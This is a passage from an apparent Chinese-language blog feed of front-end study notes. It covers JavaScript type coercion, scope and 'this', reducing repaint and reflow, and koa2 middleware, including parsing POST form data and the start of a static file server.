<code>x.toString()</code>，如果转换为基础类型，就返回转换的值</li><li>如果都没有返回原始类型，就会报错</li></ul><p>当然你也可以重写 <code>Symbol.toPrimitive</code> ，该方法在转原始类型时调用优先级最高。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  <span class="title function_">valueOf</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  [<span class="title class_">Symbol</span>.<span class="property">toPrimitive</span>]() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">1</span> + a <span class="comment">// =&gt; 3</span></span><br></pre></td></tr></table></figure><p><strong>iii. 四则运算符</strong><br>加法运算符不同于其他几个运算符，它有以下几个特点：</p><ul><li><p>运算中其中一方为字符串，那么就会把另一方也转换为字符串</p></li><li><p>如果一方不是字符串或者数字，那么会将它转换为数字或者字符串</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">&#x27;1&#x27;</span> <span class="regexp">//</span> <span class="string">&#x27;11&#x27;</span></span><br><span class="line">true + true <span class="regexp">//</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span> + [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="regexp">//</span> <span class="string">&quot;41,2,3&quot;</span></span><br></pre></td></tr></table></figure><p>如果你对于答案有疑问的话，请看解析：</p></li><li><p>对于第一行代码来说，触发特点一，所以将数字 <code>1</code> 转换为字符串，得到结果 <code>&#39;11&#39;</code></p></li><li><p>对于第二行代码来说，触发特点二，所以将 <code>true</code> 转为数字 <code>1</code></p></li><li><p>对于第三行代码来说，触发特点二，所以将数组通过 <code>toString</code> 转为字符串 <code>&#39;1,2,3&#39;</code>，得到结果 <code>&#39;41,2,3&#39;</code></p></li></ul><p>另外对于加法还需要注意这个表达式 <code>&#39;a&#39; + + &#39;b&#39;</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> + + <span class="string">&#x27;b&#x27;</span> <span class="regexp">//</span> -&gt; <span class="string">&quot;aNaN&quot;</span></span><br></pre></td></tr></table></figure><p>因为 <code>+ &#39;b&#39;</code> 等于 <code>NaN</code>，所以结果为 <code>&quot;aNaN&quot;</code>，你可能也会在一些代码中看到过 <code>+ &#39;1&#39;</code> 的形式来快速获取 number 类型。</p><p>那么对于除了加法的运算符来说，只要其中一方是数字，那么另一方就会被转为数字</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">4 </span>* <span class="comment">&#x27;3&#x27; // 12</span></span><br><span class="line"><span class="symbol">4 </span>* [] // <span class="number">0</span></span><br><span class="line"><span class="symbol">4 </span>* [<span class="number">1</span>, <span class="number">2</span>] // NaN</span><br></pre></td></tr></table></figure><p><strong>iiii. 比较运算符</strong></p><ul><li>如果是对象，就通过 <code>toPrimitive</code> 转换对象</li><li>如果是字符串，就通过 <code>unicode</code> 字符索引来比较<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  <span class="title function_">valueOf</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">a &gt; -<span class="number">1</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>在以上代码中，因为 a 是对象，所以会通过 valueOf 转换为原始类型再比较值。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javascript细节总结1</title>
      <link href="/Blog/2019/01/02/day_thinking/Javascript%E7%BB%86%E8%8A%82%E6%80%BB%E7%BB%931/index/"/>
      <url>/Blog/2019/01/02/day_thinking/Javascript%E7%BB%86%E8%8A%82%E6%80%BB%E7%BB%931/index/</url>
      
        <content type="html"><![CDATA[<h3 id="1-javascript无动态作用域链"><a href="#1-javascript无动态作用域链" class="headerlink" title="1.javascript无动态作用域链"></a>1.javascript无动态作用域链</h3><p>栗子如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">function s() &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">x();</span><br><span class="line">&#125;</span><br><span class="line">function x() &#123;</span><br><span class="line">console.log(a);</span><br><span class="line">&#125;</span><br><span class="line">s(); <span class="comment">//a = 1</span></span><br></pre></td></tr></table></figure><p>词法作用域让foo()中的a通过RHS引用到了全局作用域中的a，因此会输出2；而动态作用域并不关心函数和作用域是如何声明以及在何处声明的，只关心它们从何处调用。换句话说，作用域是基于调用栈的，而不是代码中的作用域嵌套；JAVASCRIPT不具有动态作用域（但this机制在某种程度上很像动态作用域的）。</p><h3 id="2-this指向问题"><a href="#2-this指向问题" class="headerlink" title="2.this指向问题"></a>2.this指向问题</h3><p>栗子如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function a() &#123;</span><br><span class="line">    function c() &#123;</span><br><span class="line">        <span class="keyword">return</span> this;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> c();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> o <span class="operator">=</span> new a();</span><br></pre></td></tr></table></figure><p>此时上面的this指向是全局对象还是对象o？；</p><h3 id="3-重绘（Repaint）和回流（Reflow）"><a href="#3-重绘（Repaint）和回流（Reflow）" class="headerlink" title="3.重绘（Repaint）和回流（Reflow）"></a>3.重绘（Repaint）和回流（Reflow）</h3><p>重绘和回流是渲染步骤中的一小节，但是这两个步骤对于性能影响很大。</p><ul><li>重绘是当节点需要更改外观而不会影响布局的，比如改变 color 就叫称为重绘</li><li>回流是布局或者几何属性需要改变就称为回流。</li></ul><p>回流必定会发生重绘，重绘不一定会引发回流。回流所需的成本比重绘高的多，改变深层次的节点很可能导致父节点的一系列回流。</p><p>所以以下几个动作可能会导致性能问题：</p><ul><li>改变 window 大小</li><li>改变字体</li><li>添加或删除样式</li><li>文字改变</li><li>定位或者浮动</li><li>盒模型</li></ul><p><strong>减少重绘和回流</strong></p><ul><li><ol><li>使用 translate 替代 top<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.test</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 引起回流</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.test&#x27;</span>).<span class="property">style</span>.<span class="property">top</span> = <span class="string">&#x27;100px&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><ol start="2"><li>使用 <code>visibility</code> 替换 <code>display: none</code> ，因为前者只会引起重绘，后者会引发回流（改变了布局）</li></ol></li><li><ol start="3"><li>把 DOM 离线后修改，比如：先把 DOM 给 <code>display:none</code> (有一次 Reflow)，然后你修改100次，然后再把它显示出来</li></ol></li><li><ol start="4"><li>不要把 DOM 结点的属性值放在一个循环里当成循环里的变量<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span><span class="params">(let i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 获取 offsetTop 会导致回流，因为需要去获取正确的值</span></span><br><span class="line">    console<span class="selector-class">.log</span>(document<span class="selector-class">.querySelector</span>(<span class="string">&#x27;.test&#x27;</span>)<span class="selector-class">.style</span>.offsetTop)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><ol start="5"><li>不要使用 table 布局，可能很小的一个小改动会造成整个 table 的重新布局</li></ol></li><li><ol start="6"><li>动画实现的速度的选择，动画速度越快，回流次数越多，也可以选择使用 requestAnimationFrame</li></ol></li><li><ol start="7"><li>CSS 选择符从右往左匹配查找，避免 DOM 深度过深</li></ol></li><li><ol start="8"><li>将频繁运行的动画变为图层，图层能够阻止该节点回流影响别的元素。比如对于 video 标签，浏览器会自动将该节点变为图层。</li></ol></li></ul><p><img src="/Blog/2019/01/02/day_thinking/Javascript%E7%BB%86%E8%8A%82%E6%80%BB%E7%BB%931/index/img.png"></p>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>koa2进阶学习笔记</title>
      <link href="/Blog/2018/12/28/node_js/koa2%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index/"/>
      <url>/Blog/2018/12/28/node_js/koa2%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index/</url>
      
        <content type="html"><![CDATA[<h2 id="koa2特性"><a href="#koa2特性" class="headerlink" title="koa2特性"></a>koa2特性</h2><ul><li>只提供封装好http上下文、请求、响应，以及基于async&#x2F;await的中间件容器。</li><li>利用ES7的async&#x2F;await的来处理传统回调嵌套问题和代替koa@1的generator，但是需要在node.js 7.x的harmony模式下才能支持async&#x2F;await。</li><li>中间件只支持 async&#x2F;await 封装的，如果要使用koa@1基于generator中间件，需要通过中间件koa-convert封装一下才能使用。</li></ul><h2 id="generator中间件在koa-1中的使用"><a href="#generator中间件在koa-1中的使用" class="headerlink" title="generator中间件在koa@1中的使用"></a>generator中间件在koa@1中的使用</h2><blockquote><p>generator 中间件在koa v1中可以直接use使用</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">koa</span> = <span class="keyword">require</span>(<span class="string">&#x27;koa&#x27;</span>)  <span class="comment">// koa v1</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">loggerGenerator</span>  = <span class="keyword">require</span>(<span class="string">&#x27;./middleware/logger-generator&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">app</span> = <span class="title function_ invoke__">koa</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="keyword">use</span>(<span class="title function_ invoke__">loggerGenerator</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="keyword">use</span>(<span class="function"><span class="keyword">function</span> *(<span class="params"> </span>) </span>&#123;</span><br><span class="line">    this.body = <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_ invoke__">listen</span>(<span class="number">3000</span>)</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&#x27;the server is starting at port 3000&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="generator中间件在koa-2中的使用"><a href="#generator中间件在koa-2中的使用" class="headerlink" title="generator中间件在koa@2中的使用"></a>generator中间件在koa@2中的使用</h2><blockquote><p>generator 中间件在koa v2中需要用koa-convert封装一下才能使用</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>) <span class="comment">// koa v2</span></span><br><span class="line"><span class="keyword">const</span> convert = <span class="built_in">require</span>(<span class="string">&#x27;koa-convert&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> loggerGenerator  = <span class="built_in">require</span>(<span class="string">&#x27;./middleware/logger-generator&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">convert</span>(<span class="title function_">loggerGenerator</span>()))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params"> ctx </span>) =&gt;</span> &#123;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;the server is starting at port 3000&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="原生方法解析出POST请求上下文中的表单数据"><a href="#原生方法解析出POST请求上下文中的表单数据" class="headerlink" title="原生方法解析出POST请求上下文中的表单数据"></a>原生方法解析出POST请求上下文中的表单数据</h2><blockquote><p>原理：对于POST请求的处理，koa2没有封装获取参数的方法，需要通过解析上下文context中的原生node.js请求对象req，将POST表单数据解析成query string（例如：a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3），再将query string 解析成JSON格式（例如：{“a”:”1”, “b”:”2”, “c”:”3”}）</p></blockquote><blockquote><p>注意：ctx.request是context经过封装的请求对象，ctx.req是context提供的node.js原生HTTP请求对象，同理ctx.response是context经过封装的响应对象，ctx.res是context提供的node.js原生HTTP请求对象。</p></blockquote><p>具体koa2 API文档可见 <a href="https://github.com/koajs/koa/blob/master/docs/api/context.md#ctxreq">https://github.com/koajs/koa/blob/master/docs/api/context.md#ctxreq</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析上下文里node原生请求的POST参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parsePostData</span>(<span class="params"> ctx </span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> postdata = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      ctx.<span class="property">req</span>.<span class="title function_">addListener</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        postdata += data</span><br><span class="line">      &#125;)</span><br><span class="line">      ctx.<span class="property">req</span>.<span class="title function_">addListener</span>(<span class="string">&quot;end&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> parseData = <span class="title function_">parseQueryStr</span>( postdata )</span><br><span class="line">        <span class="title function_">resolve</span>( parseData )</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( err ) &#123;</span><br><span class="line">      <span class="title function_">reject</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将POST请求参数字符串解析成JSON</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseQueryStr</span>(<span class="params"> queryStr </span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> queryData = &#123;&#125;</span><br><span class="line">  <span class="keyword">let</span> queryStrList = queryStr.<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>( queryStrList )</span><br><span class="line">  <span class="keyword">for</span> (  <span class="keyword">let</span> [ index, queryStr ] <span class="keyword">of</span> queryStrList.<span class="title function_">entries</span>()  ) &#123;</span><br><span class="line">    <span class="keyword">let</span> itemList = queryStr.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    queryData[ itemList[<span class="number">0</span>] ] = <span class="built_in">decodeURIComponent</span>(itemList[<span class="number">1</span>])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queryData</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栗子🌰</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">const Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line">const app = <span class="keyword">new</span> Koa()</span><br><span class="line"></span><br><span class="line">app.use( <span class="keyword">async</span> ( ctx ) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ctx.url === <span class="string">&#x27;/&#x27;</span> &amp;&amp; ctx.method === <span class="string">&#x27;GET&#x27;</span> ) &#123;</span><br><span class="line">    <span class="regexp">//</span> 当GET请求时候返回表单页面</span><br><span class="line">    let html = `<span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      &lt;h1&gt;koa2 request post demo&lt;/h1&gt;</span></span><br><span class="line"><span class="language-javascript">      <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>userName<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;userName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>nickName<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;nickName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>email<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-javascript">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="language-javascript">    </span>`</span><br><span class="line">    ctx.body = html</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( ctx.url === <span class="string">&#x27;/&#x27;</span> &amp;&amp; ctx.method === <span class="string">&#x27;POST&#x27;</span> ) &#123;</span><br><span class="line">    <span class="regexp">//</span> 当POST请求的时候，解析POST表单里的数据，并显示出来</span><br><span class="line">    let postData = <span class="keyword">await</span> parsePostData( ctx )</span><br><span class="line">    ctx.body = postData</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="regexp">//</span> 其他请求显示<span class="number">404</span></span><br><span class="line">    ctx.body = <span class="string">&#x27;&lt;h1&gt;404！！！ o(╯□╰)o&lt;/h1&gt;&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 解析上下文里node原生请求的POST参数</span><br><span class="line">function parsePostData( ctx ) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      let postdata = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      ctx.req.addListener(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">(data)</span> =&gt;</span> &#123;</span><br><span class="line">        postdata += data</span><br><span class="line">      &#125;)</span><br><span class="line">      ctx.req.addListener(<span class="string">&quot;end&quot;</span>,function()&#123;</span><br><span class="line">        let parseData = parseQueryStr( postdata )</span><br><span class="line">        resolve( parseData )</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( err ) &#123;</span><br><span class="line">      reject(err)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 将POST请求参数字符串解析成<span class="built_in">JSON</span></span><br><span class="line">function parseQueryStr( queryStr ) &#123;</span><br><span class="line">  let queryData = &#123;&#125;</span><br><span class="line">  let queryStrList = queryStr.split(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">  console.log( queryStrList )</span><br><span class="line">  <span class="keyword">for</span> (  let [ index, queryStr ] <span class="keyword">of</span> queryStrList.entries()  ) &#123;</span><br><span class="line">    let itemList = queryStr.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    queryData[ itemList[<span class="number">0</span>] ] = <span class="built_in">decodeURIComponent</span>(itemList[<span class="number">1</span>])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queryData</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;[demo] request post is starting at port 3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="原生koa2实现静态资源服务器"><a href="#原生koa2实现静态资源服务器" class="headerlink" title="原生koa2实现静态资源服务器"></a>原生koa2实现静态资源服务器</h2><blockquote><p>代码目录：<br>├── static # 静态资源目录<br>│   ├── css&#x2F;<br>│   ├── image&#x2F;<br>│   ├── js&#x2F;<br>│   └── index.html<br>├── util # 工具代码<br>│   ├── content.js # 读取请求内容<br>│   ├── dir.js # 读取目录内容<br>│   ├── file.js # 读取文件内容<br>│   ├── mimes.js # 文件类型列表<br>│   └── walk.js # 遍历目录内容<br>└── index.js # 启动入口文件</p></blockquote><p><strong>index</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> content = <span class="built_in">require</span>(<span class="string">&#x27;./util/content&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> mimes = <span class="built_in">require</span>(<span class="string">&#x27;./util/mimes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 